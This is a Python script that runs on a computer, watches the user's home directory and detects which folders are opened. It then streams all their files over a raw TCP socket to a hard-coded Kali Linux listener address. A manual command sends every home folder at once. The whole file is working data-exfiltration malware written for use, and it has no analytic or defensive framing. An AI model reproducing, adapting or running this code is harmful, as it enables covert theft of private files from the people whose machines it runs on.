import os
import time
import socket
import threading
import sys
from datetime import datetime

# ============= CONFIG =============
KALI_IP = '192.168....' 
KALI_PORT = 9998
CHUNK_SIZE = 8192
MAX_FILE_SIZE = 100 * 1024 * 1024
SCAN_INTERVAL = 2
# ==================================

print("="*60)
print("📤 FOLDER SENDER - FIXED")
print("="*60)
print(f"🎯 Target: {KALI_IP}:{KALI_PORT}")
print("="*60)

# ============= CONNECTION TEST =============
def test_connection():
    for i in range(5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((KALI_IP, KALI_PORT))
            s.send(b"TEST")
            s.close()
            return True
        except Exception as e:
            print(f"[*] Attempt {i+1}/5 failed: {e}")
            time.sleep(2)
    return False

if test_connection():
    print("[+] ✅ Connection test PASSED!")
else:
    print("[-] ❌ Connection test FAILED!")
    print("[*] Make sure Kali receiver is running!")
    input("Press Enter to exit...")
    sys.exit(1)

# ============= SEND FOLDER FUNCTION =============
def send_folder(folder_path):
    """Send folder to Kali"""
    sock = None
    try:
        folder_name = os.path.basename(folder_path)
        
        # Skip empty/system folders
        if folder_name in ['Recent', 'Application Data', 'Local Settings', 'Cookies', 'Temp']:
            print(f"[-] Skipping system folder: {folder_name}")
            return
        
        print(f"\n[+] 📂 Sending: {folder_name}")
        
        # Collect files
        files = []
        total = 0
        
        for root, dirs, names in os.walk(folder_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for name in names:
                path = os.path.join(root, name)
                try:
                    size = os.path.getsize(path)
                    if size > 0 and size < MAX_FILE_SIZE:
                        rel = os.path.relpath(path, folder_path)
                        files.append((rel, size))
                        total += size
                except:
                    pass
        
        if not files:
            print(f"[-] No files in {folder_name}")
            return
        
        print(f"[*] Found {len(files)} files, {total:,} bytes")
        
        # Connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.settimeout(30)
        sock.connect((KALI_IP, KALI_PORT))
        print("[+] Connected to Kali!")
        
        # Send folder name
        name = os.path.basename(folder_path)
        sock.sendall(f"FOLDER:{name}\n".encode())
        time.sleep(0.2)
        
        # Send file count
        sock.sendall(f"COUNT:{len(files)}\n".encode())
        time.sleep(0.2)
        
        # Send each file
        for idx, (rel, size) in enumerate(files, 1):
            path = os.path.join(folder_path, rel)
            filename = os.path.basename(path)
            
            print(f"\n[{idx}/{len(files)}] Sending: {filename} ({size:,} bytes)")
            
            sock.sendall(f"FILE:{rel}:{size}\n".encode())
            time.sleep(0.1)
            
            sent = 0
            with open(path, 'rb') as f:
                while sent < size:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    sock.sendall(chunk)
                    sent += len(chunk)
                    
                    if size > 1024*1024:
                        if sent % (1024*1024) == 0 or sent == size:
                            progress = (sent / size) * 100
                            print(f"\r   Progress: {sent:,}/{size:,} bytes ({progress:.1f}%)", end='', flush=True)
            
            print(f"\n[+] Sent: {filename}")
            time.sleep(0.05)
        
        sock.sendall(b"COMPLETE\n")
        time.sleep(0.2)
        sock.close()
        
        print(f"\n[+] ✅ Folder sent: {name}")
        print(f"[+] Total: {len(files)} files, {total:,} bytes")
        print("-"*60)
        
    except socket.timeout:
        print(f"[-] ❌ Connection timeout! Kali receiver might have stopped.")
    except ConnectionResetError:
        print(f"[-] ❌ Connection reset! Restart Kali receiver.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        try:
            if sock:
                sock.close()
        except:
            pass

# ============= GET ALL FOLDERS =============
def get_all_folders():
    """Get all folders in home directory"""
    home = os.path.expanduser("~")
    folders = []
    
    try:
        for item in os.listdir(home):
            path = os.path.join(home, item)
            if os.path.isdir(path) and not item.startswith('.'):
                skip = ['windows', 'system32', 'program files', 'appdata', 
                       'temp', 'cache', 'microsoft', 'google', 'recycle',
                       'Recent', 'Application Data', 'Local Settings', 'Cookies']
                if not any(x in item.lower() for x in skip):
                    folders.append(path)
    except:
        pass
    
    return folders

# ============= MONITOR ONLY ACCESSED FOLDERS =============
def monitor_accessed_folders():
    """Monitor only folders that are opened/accessed"""
    print("[*] Starting targeted monitor...")
    print("[*] Sirf wohi folder send hoga jo aap open karein!")
    
    sent_folders = {}
    
    while True:
        try:
            current_time = time.time()
            folders = get_all_folders()
            
            for folder in folders:
                try:
                    access_time = os.path.getatime(folder)
                    
                    if current_time - access_time <= 3:
                        folder_name = os.path.basename(folder)
                        
                        if folder in sent_folders:
                            if current_time - sent_folders[folder] < 5:
                                continue
                        
                        print(f"\n[+] 📂 Folder opened: {folder_name}")
                        sent_folders[folder] = current_time
                        
                        threading.Thread(target=send_folder, args=(folder,), daemon=True).start()
                        time.sleep(0.5)
                        
                except Exception as e:
                    continue
            
            if len(sent_folders) > 50:
                old_time = current_time - 3600
                sent_folders = {f: t for f, t in sent_folders.items() if t > old_time}
            
            time.sleep(SCAN_INTERVAL)
            
        except Exception as e:
            print(f"[-] Monitor error: {e}")
            time.sleep(5)

# ============= KEYBOARD LISTENER =============
def keyboard_listener():
    """Optional keyboard listener"""
    while True:
        try:
            cmd = input("\n> ").strip().lower()
            if cmd == 's':
                print("[*] Manual scan...")
                folders = get_all_folders()
                for folder in folders:
                    threading.Thread(target=send_folder, args=(folder,), daemon=True).start()
                    time.sleep(0.3)
            elif cmd == 'q':
                print("[*] Exiting...")
                sys.exit(0)
            elif cmd == 'h':
                print("[*] Commands: s=scan, q=quit, h=help")
        except:
            pass

# ============= MAIN =============
def main():
    print("\n[*] Starting targeted monitor...")
    
    monitor = threading.Thread(target=monitor_accessed_folders, daemon=True)
    monitor.start()
    
    keyboard = threading.Thread(target=keyboard_listener, daemon=True)
    keyboard.start()
    
    print(f"[*] 📁 Monitoring: {os.path.expanduser('~')}")
    print("[*] ⚡ Sirf wohi folder send hoga jo aap open karein!")
    print("[*] 🔄 Automatic detection")
    print("[*] ⌨️  's'=scan all, 'q'=quit, 'h'=help")
    print("\n" + "-"*60)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        sys.exit(0)

if __name__ == "__main__":
    main()
